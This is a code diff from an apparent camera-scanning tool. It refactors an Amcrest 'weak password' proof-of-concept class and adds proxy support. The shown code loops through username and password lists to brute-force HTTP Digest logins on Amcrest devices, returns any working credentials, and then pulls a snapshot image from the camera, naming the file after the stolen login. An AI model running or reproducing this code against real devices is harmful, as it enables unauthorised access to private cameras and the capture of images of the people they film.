@@ -19,20 +19,19 @@ class AmcrestWeakPassword(POCTemplate):
 
     def verify(self, ip, port=80):
         """Amcrest uses Dahua RPC2 login and HTTP Digest Auth"""
-        headers = {
-            'User-Agent': self.config.user_agent,
-            'Connection': 'close',
-        }
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
                     # Try HTTP Digest Auth against device info endpoint
                     r = requests.get(
-                        f"http://{ip}:{port}/cgi-bin/magicBox.cgi?action=getDeviceType",
+                        self._get_url(ip, port, '/cgi-bin/magicBox.cgi?action=getDeviceType'),
                         auth=HTTPDigestAuth(user, password),
                         headers=headers,
                         verify=False,
-                        timeout=self.config.timeout
+                        timeout=self.config.timeout,
+                        proxies=proxies
                     )
                     if r.status_code == 200 and 'type=' in r.text:
                         return ip, str(port), self.product, str(user), str(password), self.name
@@ -43,7 +42,7 @@ class AmcrestWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
+        url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
         return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
 
 
